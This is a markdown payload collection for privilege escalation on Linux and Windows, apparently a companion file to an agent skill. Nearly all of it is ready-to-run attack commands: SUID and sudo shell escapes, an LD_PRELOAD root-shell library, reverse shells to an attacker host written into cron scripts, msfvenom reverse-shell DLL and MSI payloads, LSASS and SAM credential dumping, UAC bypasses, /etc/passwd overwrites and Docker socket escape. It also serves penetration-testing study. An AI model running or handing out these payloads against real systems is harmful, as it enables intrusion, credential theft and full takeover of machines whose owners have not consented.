# Payloads -- Privilege Escalation

> This file is a companion to `SKILL.md`, organizing all attack payloads and commands by category.

---

## 1. Automated Enumeration

### 1.1 Linux Enumeration with linpeas

```bash
# Transfer linpeas to target (from attacker machine)
python3 -c "import http.server; http.server.test(8000)" # serve files
# On target:
wget http://attacker_ip:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://attacker_ip:8000/linpeas.sh -o /tmp/linpeas.sh

# Run linpeas with all checks
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.out

# Run linpeas in fast mode (skip time-consuming checks)
/tmp/linpeas.sh -q

# Run linpeas and search for specific keywords in output
/tmp/linpeas.sh 2>/dev/null | grep -i -E "sudo|suid|capability|cron|nfs|kernel|writable"

# Pipe through less for interactive review
/tmp/linpeas.sh -a 2>/dev/null | less -R
```

### 1.2 Windows Enumeration with winpeas

```powershell
# Transfer winpeas to target (PowerShell download)
Invoke-WebRequest -Uri "http://attacker_ip:8000/winPEAS.exe" -OutFile "C:\Temp\winPEAS.exe"
# Or using certutil
certutil -urlcache -split -f http://attacker_ip:8000/winPEAS.exe C:\Temp\winPEAS.exe

# Run winpeas with all checks
C:\Temp\winPEAS.exe quiet cmd fast

# Run specific winpeas categories
C:\Temp\winPEAS.exe servicesinfo    # Service misconfigurations
C:\Temp\winPEAS.exe credentials     # Stored credentials
C:\Temp\winPEAS.exe systeminfo      # System information and patches
```

### 1.3 Manual System Information Gathering

```bash
# Linux system profiling
uname -a                           # Kernel version and architecture
cat /etc/os-release                # Distribution and version
cat /proc/version                  # Kernel compile info
hostname                           # Hostname
id                                 # Current user and groups
whoami                             # Current username
cat /etc/passwd                    # All users on the system
cat /etc/group                     # All groups
env                                # Environment variables
dpkg -l 2>/dev/null                # Installed packages (Debian)
rpm -qa 2>/dev/null                # Installed packages (RHEL)
```

```powershell
# Windows system profiling
systeminfo                         # Full system information
whoami /all                        # Current user, groups, and privileges
hostname                           # Hostname
net user                           # Local users
net localgroup administrators      # Local admins
net group "Domain Admins" /domain  # Domain admins (if domain-joined)
set                                # Environment variables
```

---

## 2. SUID Binary Exploitation

### 2.1 SUID Discovery and Analysis

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

# Find world-writable files with SUID (critical misconfiguration)
find / -perm -4007 -type f 2>/dev/null

# List SUID binaries with details
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Compare SUID binaries against known system defaults
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_list.txt
```

### 2.2 GTFOBins SUID Exploitation

```bash
# SUID find -- execute commands as file owner (root)
find . -exec /bin/sh -p \;

# SUID vim -- spawn shell from within vim
vim -c ':!/bin/sh'
# Or inside vim:
:py3 import os; os.execl('/bin/sh', 'sh', '-p')

# SUID python/python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID bash
bash -p

# SUID less/more
less /etc/passwd
# Inside less:
!/bin/sh

# SUID env
env /bin/sh -p

# SUID cp -- overwrite /etc/passwd
# Generate password hash: openssl passwd -1 -salt newuser newpass
echo 'newuser:$1$newuser$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd_entry
cp /tmp/passwd_entry /etc/passwd

# SUID nmap (older versions with interactive mode)
nmap --interactive
!sh

# SUID nano -- read/write any file
nano /etc/shadow

# SUID pkexec -- PwnKit (CVE-2021-4034)
# See kernel exploit section for PwnKit details
```

---

## 3. sudo Misconfiguration Abuse

### 3.1 sudo Rule Enumeration

```bash
# List sudo permissions for current user
sudo -l

# Check if sudo version is vulnerable
sudo --version
# CVE-2021-3156 (Baron Samedit) affects sudo < 1.9.5p2
```

### 3.2 Exploiting Common sudo Misconfigurations

```bash
# NOPASSWD for specific binaries -- direct shell escape
# Check GTFOBins for each binary allowed in sudo -l

# sudo vim/nano
sudo vim -c ':!/bin/bash'
sudo nano
# Inside nano: ^R^X, then: reset; sh 1>&0 2>&0

# sudo less/more
sudo less /etc/passwd
# Inside less: !bash

# sudo find
sudo find / -exec /bin/bash \;

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo python/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# sudo perl
sudo perl -e 'exec "/bin/bash";'

# sudo ruby
sudo ruby -e 'exec "/bin/bash"'

# sudo lua
sudo lua -e 'os.execute("/bin/bash")'

# sudo ftp
sudo ftp
# Inside ftp: !/bin/bash

# sudo nmap
sudo nmap --interactive
!bash
# Or: sudo nmap --script <(echo 'os.execute("/bin/bash")')
```

### 3.3 sudo Wildcard Injection

```bash
# If sudo -l shows: (root) NOPASSWD: /usr/bin/tar cf /tmp/backup.tar *
# Exploit tar wildcard with checkpoint:

# On target, in the directory tar operates on:
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh privesc.sh'
echo 'chmod u+s /bin/bash' > privesc.sh
chmod +x privesc.sh

# When root runs tar, it processes the checkpoint arguments
# /bin/bash now has SUID bit set

# Similar technique for chown/chmod with wildcards
# If sudo rule uses wildcards with file manipulation commands
```

### 3.4 sudo Environment Variable Exploitation

```bash
# If sudo -l shows env_keep options:
# env_keep+=LD_PRELOAD

# Create shared library that spawns root shell
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>

# If env_keep+=PYTHONPATH
# Create malicious Python module in writable PYTHONPATH directory
```

### 3.5 sudo CVE Exploitation

```bash
# CVE-2021-3156 (Baron Samedit) -- heap overflow in sudo
# Affects: sudo 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1
# Check version:
sudo --version

# Exploit (requires local user, no sudo permissions needed)
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <target_index>

# CVE-2019-14287 -- sudo user ID bypass
# If sudo -l shows: (ALL, !root) NOPASSWD: /bin/bash
# Bypass with:
sudo -u#-1 /bin/bash
```

---

## 4. Linux Capabilities Exploitation

### 4.1 Capability Enumeration

```bash
# Enumerate all capabilities on the system
getcap -r / 2>/dev/null

# Display capabilities of a specific binary
getcap /usr/bin/python3

# Display all capabilities for the current user context
capsh --print

# List all capability names and descriptions
capsh --supports
```

### 4.2 Exploiting Specific Capabilities

```bash
# cap_setuid -- escalate to root
# Python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Perl with cap_setuid:
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# cap_dac_read_search -- read any file (bypass file permissions)
# tar with this capability can read /etc/shadow:
tar xf /etc/shadow -C /tmp/
# Or use debugfs for direct filesystem access

# cap_net_raw -- capture network traffic and craft raw packets
# tcpdump with cap_net_raw:
tcpdump -i eth0 -w /tmp/capture.pcap
# Capture credentials from plaintext protocols
tcpdump -i eth0 -A -s 0 port 21 or port 110 or port 143 or port 25

# cap_sys_admin -- broad system administration capability
# Mount filesystem:
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
# Modify iptables, create namespaces, access kernel modules

# cap_sys_ptrace -- inject code into running processes
# Attach to root process and inject shellcode:
gdb -p $(pgrep -f "root_owned_process")
# Inside gdb:
# call system("chmod u+s /bin/bash")

# cap_setfcap -- set file capabilities
# Give bash cap_setuid:
python3 -c '
import os
os.setuid(0)
os.system("setcap cap_setuid+ep /usr/bin/python3_copy")
'
```

---

## 5. Cron Job Abuse

### 5.1 Cron Enumeration

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/
ls -la /var/spool/cron/

# Find all cron-related files
find /etc/cron* -type f 2>/dev/null

# Monitor running cron processes in real time
./pspy64 -pf -i 1000

# Check anacron for delayed job execution
cat /etc/anacrontab
```

### 5.2 Writable Cron Script Exploitation

```bash
# Find writable cron scripts
find /etc/cron* -writable 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/

# If a cron script running as root is writable:
# Append reverse shell payload
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /etc/cron.d/writable_script.sh

# Or add SUID to bash
echo 'chmod u+s /bin/bash' >> /etc/cron.d/writable_script.sh

# Or copy /bin/bash and set SUID
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /etc/cron.d/writable_script.sh

# Wait for cron execution, then:
/tmp/rootbash -p
```

### 5.3 Cron PATH Hijacking

```bash
# If /etc/crontab defines a custom PATH with writable directory:
# Example: PATH=/home/user:/usr/local/bin:/usr/bin:/bin

# Check for writable directories in cron PATH
echo "$CRON_PATH" | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done

# Place malicious binary before the legitimate one
echo '#!/bin/bash' > /home/user/target_binary_name
echo 'chmod u+s /bin/bash' >> /home/user/target_binary_name
chmod +x /home/user/target_binary_name

# Cron will execute the malicious binary first due to PATH order
```

### 5.4 Cron Wildcard Abuse

```bash
# If a cron job runs: tar cf backup.tar * in a writable directory
# Create exploit files using tar checkpoint arguments:
cd /path/to/cron/working/directory
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' > shell.sh
chmod +x shell.sh

# When cron runs tar, it interprets the filenames as arguments
```

---

## 6. NFS Root Squashing

```bash
# Check NFS exports on target
cat /etc/exports 2>/dev/null

# Look for no_root_squash entries
# Example: /share  *(rw,no_root_squash)

# On attacker machine, mount the NFS share
mkdir -p /mnt/nfs_share
mount -t nfs target_ip:/share /mnt/nfs_share

# Create a SUID binary on the mounted share (as root on attacker)
cp /bin/bash /mnt/nfs_share/rootbash
chmod u+s /mnt/nfs_share/rootbash

# On target, execute the SUID binary
/mnt/nfs_share/rootbash -p
# Result: root shell on target
```

---

## 7. Kernel Exploits

### 7.1 Kernel Exploit Identification

```bash
# Identify kernel version
uname -r
cat /proc/version
cat /etc/os-release

# Run linux-exploit-suggester
./linux-exploit-suggester.sh

# Run with specific kernel version
./linux-exploit-suggester.sh --uname "5.4.0-42-generic"

# Run linux-exploit-suggester-2 (Python version)
python3 linux-exploit-suggester-2.py
```

### 7.2 Common Kernel Exploits

```bash
# DirtyPipe (CVE-2022-0847) -- Linux kernel 5.8 to 5.16.11
# Overwrite any readable file (including SUID binaries)
gcc -o dirtypipe dirtypipe.c
./dirtypipe /usr/bin/sudo 1   # Overwrite sudo with root-owned payload

# DirtyCow (CVE-2016-5195) -- Linux kernel 2.6.22 to 4.8.3
# Race condition in COW handling
gcc -pthread dirty.c -o dirty -lcrypt
./dirty new_password
# Creates backup of passwd at /tmp/passwd.bak

# PwnKit (CVE-2021-4034) -- polkit pkexec SUID
# Affects almost all Linux distributions with polkit installed
gcc pwnkit.c -o pwnkit
./pwnkit
# Immediate root shell

# GameOver(lay) (CVE-2023-2640, CVE-2023-32629) -- Ubuntu OverlayFS
# Affects Ubuntu kernels using OverlayFS
gcc -o gameoverlay gameover.c
./gameoverlay

# StackRot (CVE-2023-3269) -- Linux kernel stack escalation
# Use exploit-suggester to verify applicability
```

---

## 8. Windows Token Impersonation

### 8.1 Token Privilege Enumeration

```powershell
# Current user privileges
whoami /priv

# Key privileges for escalation:
# SeImpersonatePrivilege    -> Potato attacks (Juicy, Rotten, Sweet)
# SeBackupPrivilege         -> Read any file (SAM, SYSTEM registry)
# SeDebugPrivilege          -> Access any process (LSASS dump)
# SeLoadDriverPrivilege     -> Load malicious kernel driver
# SeTakeOwnershipPrivilege  -> Take ownership of any object
# SeAssignPrimaryToken      -> Assign tokens to processes

# List running processes with their tokens
# (requires tools like Process Explorer or Handle)
tasklist /v

# Check for available tokens (PowerShell)
Get-Process | Select-Object Name, Id, SessionId
```

### 8.2 SeImpersonatePrivilege Exploitation (Potato Attacks)

```powershell
# JuicyPotato (Windows 7/8/10, Server 2008/2012/2016)
# Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# Find valid CLSIDs for target system
# Use JuicyPotato CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# PrintSpoofer (works on Windows 10 / Server 2019 where JuicyPotato fails)
PrintSpoofer.exe -i -c cmd

# GodPotato (works on most Windows versions)
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato (combined potato attack tool)
SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"
```

### 8.3 SeBackupPrivilege Exploitation

```powershell
# Read SAM and SYSTEM registry hives
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak

# Transfer to attacker and extract hashes
# On attacker:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# Read any file using BackupRead API
# Using PowerShell with SeBackupPrivilege:
Import-Module .\SeBackupPrivilege.psm1
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\secret.txt C:\Temp\secret.txt
```

### 8.4 SeDebugPrivilege Exploitation

```powershell
# Dump LSASS memory for credential extraction
# Using procdump (Sysinternals, signed binary):
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Using comsvcs.dll (no external tool needed):
rundll32.exe comsvcs.dll,MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Parse dump offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Using nanodump (stealthier, direct syscall approach):
nanodump.exe --write C:\Temp\lsass.dmp
```

---

## 9. Windows Service Exploitation

### 9.1 Unquoted Service Path

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Example vulnerable path:
# C:\Program Files\Vulnerable Service\service.exe
# Windows tries: C:\Program.exe, then C:\Program Files\Vulnerable.exe

# Check write permissions on parent directories
# Using accesschk.exe (Sysinternals):
accesschk.exe /accepteula -uwcqv "Authenticated Users" C:\

# Place malicious executable in the intercepted path
# Example: place Program.exe in C:\
copy malicious.exe "C:\Program.exe"

# Restart the service or wait for reboot
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

### 9.2 Weak Service Permissions

```powershell
# Enumerate service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# Check specific service permissions
sc qc "ServiceName"
accesschk.exe "Authenticated Users" -accepteula -k "HKLM\System\CurrentControlSet\Services\ServiceName"

# If you can modify the service binary path:
sc config "ServiceName" binPath= "C:\Temp\malicious.exe"
sc stop "ServiceName"
sc start "ServiceName"

# Using PowerUp.ps1 for automated service enumeration
Import-Module PowerUp.ps1
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
```

### 9.3 DLL Hijacking

```powershell
# Find DLL search order hijacking opportunities
# Check which DLLs a service loads:
# Using Process Monitor (Sysinternals) to identify DLLs

# Common hijackable DLLs:
# version.dll, dbghelp.dll, uxtheme.dll, cryptbase.dll

# Create malicious DLL that loads original + payload
# Using msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o version.dll

# Place malicious DLL in service directory (before system32 in search order)
copy version.dll "C:\Program Files\Vulnerable Service\"

# Restart service
sc stop "ServiceName"
sc start "ServiceName"
```

---

## 10. Windows Registry Exploitation

### 10.1 AlwaysInstallElevated

```powershell
# Check if AlwaysInstallElevated is enabled (both keys must be set to 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are enabled (value = 1), create malicious MSI package
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o malicious.msi

# Execute MSI as standard user -- it will run as SYSTEM
msiexec /quiet /qn /i malicious.msi
```

### 10.2 Stored Credentials

```powershell
# Check for stored credentials
cmdkey /list

# If credentials are found, use them with runas
runas /savecred /user:admin C:\Temp\malicious.exe

# Search for credentials in registry
reg query "HKLM\SOFTWARE" /s /f password 2>nul
reg query "HKCU\SOFTWARE" /s /f password 2>nul

# Check for unattended install files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\sysprep\unattend.xml
type C:\Unattend.xml

# Search for credentials in files
findstr /si "password" C:\Users\*.xml C:\Users\*.txt C:\Users\*.ini 2>nul
```

### 10.3 AutoRun Programs

```powershell
# Check registry for AutoRun programs
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# If any AutoRun binary path is writable, replace it
copy /Y C:\Temp\malicious.exe "C:\Writable\AutoRun\program.exe"
```

---

## 11. UAC Bypass Techniques

### 11.1 UAC Level Check

```powershell
# Check current UAC configuration
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Values for ConsentPromptBehaviorAdmin:
# 0 = No prompt (UAC disabled)
# 1 = Prompt for credentials (secure desktop)
# 2 = Prompt for consent (secure desktop)
# 3 = Prompt for credentials
# 4 = Prompt for consent
# 5 = Default (prompt for non-Windows binaries)
```

### 11.2 UAC Bypass Methods

```powershell
# fodhelper.exe bypass (Windows 10/11)
# Set registry key to point to custom command
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
# Trigger:
fodhelper.exe
# Cleanup:
reg delete "HKCU\Software\Classes\ms-settings" /f

# eventvwr.exe bypass (Windows 7/10)
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
eventvwr.exe
# Cleanup:
reg delete "HKCU\Software\Classes\mscfile" /f

# cmstp.exe bypass (all Windows versions)
# Create malicious .inf file and execute:
cmstp.exe /s /ns malicious.inf

# DiskCleanup bypass
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Cache" /t REG_SZ /d "C:\Temp" /f
# Place malicious equiv DLL in cache path, then run DiskCleanup

# UACME tool (comprehensive UAC bypass collection)
# https://github.com/hfiref0x/UACME
Akagi64.exe <method_number> C:\Temp\malicious.exe
```

---

## 12. pspy Process Monitoring

```bash
# Monitor all processes (including those of other users) without root
./pspy64 -pf -i 1000

# Monitor with command line arguments
./pspy64 -pf -i 1000 | tee /tmp/pspy.log

# Filter for specific patterns
./pspy64 -pf -i 1000 2>/dev/null | grep -i -E "cron|root|admin|backup"

# Watch for file system events
./pspy64 -fs -i 1000

# Use pspy32 on 32-bit systems
./pspy32 -pf -i 1000
```

---

## 13. Writable /etc/passwd

```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$Xxxxx...

# Add root user to /etc/passwd
echo 'hacker:$1$hacker$Xxxxx...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or overwrite root's password field
# First backup:
cp /etc/passwd /tmp/passwd.bak
# Then modify:
sed -i 's/root:x:0:0/root:$1$hacker$Xxxxx...:0:0/' /etc/passwd

# Switch to new user
su hacker
# Password: password123

# Overwrite root password directly
echo 'root:$1$hacker$Xxxxx...:0:0:root:/root:/bin/bash' > /etc/passwd
```

---

## 14. Container Escalation Vectors

```bash
# Check if running inside a container
cat /proc/1/cgroup 2>/dev/null | grep -i docker
ls -la /.dockerenv 2>/dev/null

# Capabilities inside container (if capsh available)
capsh --print

# Check for Docker socket
ls -la /var/run/docker.sock

# If Docker socket is accessible: create privileged container
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Check for host filesystem mounts
mount | grep -E "type (nfs|cifs|ext)"
cat /proc/mounts | grep -E "host"

# Check Kubernetes service account token
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

_All payloads are for authorized penetration testing scenarios only. Unauthorized use is illegal._

_Last updated: 2026-06-04_
